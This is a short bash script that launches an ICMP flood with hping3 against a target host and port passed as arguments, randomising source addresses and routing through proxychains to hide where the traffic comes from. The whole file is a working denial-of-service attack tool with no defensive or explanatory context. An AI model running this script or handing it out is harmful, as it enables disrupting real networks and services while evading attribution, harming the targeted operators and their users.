#!/bin/bash

sudo proxychains hping3 -1 --flood --rand-source -p "$1" "$2"
